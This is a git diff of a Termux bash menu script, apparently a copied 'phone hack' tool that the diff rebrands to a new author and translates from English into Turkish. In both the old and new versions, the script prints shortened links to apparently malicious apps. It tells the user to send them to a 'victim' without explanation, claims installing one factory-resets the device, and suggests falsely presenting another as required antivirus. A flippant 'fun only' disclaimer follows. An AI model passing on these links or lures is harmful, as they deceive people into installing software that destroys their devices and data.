@@ -32,14 +32,14 @@ echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
                   @#%,.@          @#%,.@            
                      @#%,.@      @#%,.@             
                        @#%.,@  @#%,.@              
-                        Noob Hackers
+                        Mehmet Aktas
 '
 echo " " 
-echo -e "$red                       ▶Coded by$grn NITRO$red◀$rset"
-echo -e "$red                      ⫸$ylo  Noob Hackers$red ⫷$rset"
+echo -e "$red                       ▶Coded by$grn AKTAS$red◀$rset"
+echo -e "$red                      ⫸$ylo  Mehmet aktas$red ⫷$rset"
 echo 
 # Functions
-echo -e "$red                    [Infect them with fun]$rset"
+echo -e "$red                    [Onları eğlenceyle enfekte edin]$rset"
 echo " "
 echo " "
 }
@@ -64,14 +64,14 @@ echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
                   @#%,.@          @#%,.@            
                      @#%,.@      @#%,.@             
                        @#%.,@  @#%,.@              
-                        Noob Hackers
+                        Mehmet Aktaş
 '
 echo " " 
-echo -e "$red                       ▶Coded by$grn NITRO$red◀$rset"
-echo -e "$red                      ⫸$ylo  Noob Hackers$red ⫷$rset"
+echo -e "$red                       ▶Coded by$grn AKTAŞ$red◀$rset"
+echo -e "$red                      ⫸$ylo  Mehmet Aktas$red ⫷$rset"
 echo 
 # Functions
-echo -e "$red                    [Infect them with fun]$rset"
+echo -e "$red                    [Onları eğlenceyle enfekte edin]$rset"
 echo " "
 echo " "
 }
@@ -89,7 +89,7 @@ echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Chat"
 echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
 echo " "
 echo " "
-echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo -e "$grn               >＞＞＞＞＞$ylo [SEÇME]$grn ＜＜＜＜＜<$rset"
 echo " "
 echo -ne "\e[92m#SELECT OPTION\e[92m: "
 read optnz
@@ -107,17 +107,17 @@ then
 upd
 elif [ $optnz = "5" ];
 then
-am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://instagram.com/dr.mehmetaktass?utm_medium=copy_link > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "6" ];
 then
-am start -a android.intent.action.VIEW -d https://noob-hackers.github.io/noobspage > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://github.com/Drmehmetaktass/telefon-hack > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "7" ];
 then
-am start -a android.intent.action.VIEW -d https://bit.ly/nhwhatschat > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://instagram.com/dr.mehmetaktass?utm_medium=copy_link > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "8" ];
@@ -138,17 +138,15 @@ echo -e '\e[92m
                     )  (  )(_)(   )(   )__) 
                    (_)\_)(_____) (__) (____) '
 echo " "
-echo -e "\e[91m 😈  Copy below link and send it your victim and 
-say nothing to him. when he install it in his 
-device it will be factory reset and lot more happens.
-                                👇👇👇
+echo -e "\e[91m 😈 Aşağıdaki bağlantıyı kopyalayın ve kurbanınıza gönderin ve ona hiçbir şey söyleme. 
+onun içine yüklediğinde cihaz fabrika ayarlarına sıfırlanacak ve çok daha fazlası olacak.
+                                 👇👇👇
 
          \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
 
                                  👆👆👆
-Use only for fun purpose not for harming someone 😇✌️.
-And our channel is not responsible for any kind of loss 
-you do to other's by this script."
+Birilerine zarar vermek için değil sadece eğlence amaçlı kullanın 😇✌️. 
+Ve herhangi bir kayıptan kanalımız sorumlu değildir. bu komut dosyasıyla başkalarına yaparsın."
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -171,17 +169,14 @@ echo -e '\e[92m
                    (_)\_)(_____) (__) (____) '
 echo " "
 echo " "
-echo -e "\e[93m  Copy below link and send it your victim and tell him
-that he should install this application or else his 
-device will not be recovered.(Antivirus)
+echo -e "\e[93m  Aşağıdaki bağlantıyı kopyalayın ve kurbanınıza gönderin ve ona söyleyin bu uygulamayı yüklemesi gerektiğini, aksi takdirde cihaz kurtarılmayacak.(Antivirüs)
                     👇👇👇
 
         \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
 
                     👆👆👆
-Use only for fun purpose not for harming someone 😇✌️. 
-And our channel is not responsible for any kind of 
-loss you do to other's by this script."
+Birilerine zarar vermek için değil sadece eğlence amaçlı kullanın 😇✌️.
+ Ve kanalımız hiçbir şekilde sorumlu değildir. bu komut dosyasıyla başkalarına yaptığınız kayıp."
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -206,14 +201,14 @@ echo -e '\e[91m
          ─▐─█────█─▌─
          ────▌──▐────
 '
-echo -e "\e[93m                  CALL ME \e[92mNITRO" | pv -qL 10
-echo -e "\e[93m             IAM FROM \e[92mNOOB HACKERS" | pv -qL 10
-echo -e "\e[93m       IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
+echo -e "\e[93m                  BENİ BULMAK İÇİN \e[https://instagram.com/dr.mehmetaktass?utm_medium=copy_link" | pv -qL 10
+echo -e "\e[93m           BEN   \e[92mMEHMET AKTAŞ" | pv -qL 10
+echo -e "\e[93m       BEN \e[92mGEEK\e[93m BİRÇOK HEYECANLA" | pv -qL 10
 echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
-echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
+echo -e "\e[93m         OOPS... BUNUN İÇİN ÇOK ŞEY KONUŞUYORUM " | pv -qL 10
 echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
-echo -e "\e[93m        MY WEBSITE:\e[92m www.noob-hackers.com\e[0m" | pv -qL 10
-echo -e "\e[92m                BYEE.............." | pv -qL 10
+echo -e "\e[93m        MY WEBSITE:\e[92m https://instagram.com/dr.mehmetaktass?utm_medium=copy_link\e[0m" | pv -qL 10
+echo -e "\e[92m                GRŞ😉.............." | pv -qL 10
 sleep 6.0
 banner
 menu
@@ -262,8 +257,8 @@ fi
 pop(){
 clear
 echo -e "\e[96m                ╔═══════════════════════════════════╗\e[0m"
-echo -e "\e[96m                ║  \e[93mHAI, I JUST UPLOADED NEW\e[96m VIDEO   ║\e[0m"
-echo -e "\e[96m                ║      WATCH NEW VIDEO NOW.....!    ║\e[0m"
+echo -e "\e[96m                ║  \e[93mHAI,YENİ YÜKLEDİM\e[96m VIDEO   ║\e[0m"
+echo -e "\e[96m                ║      YENİ VİDEOYU ŞİMDİ İZLEYİN.....!    ║\e[0m"
 echo -e "\e[96m                ║                                   ║\e[0m"
 echo -e "\e[96m                ║        Select \e[92my\e[96m to watch\e[96m          ║\e[0m"
 echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
@@ -275,7 +270,7 @@ echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
 read p
 if [ "$p" = "y" ];
 then
-am start -a android.intent.action.VIEW -d https://noobhacktube.com 2>/dev/null
+am start -a android.intent.action.VIEW -d https://github.com/Drmehmetaktass/telefon-hack 2>/dev/null
 clear
 baner1
 menu
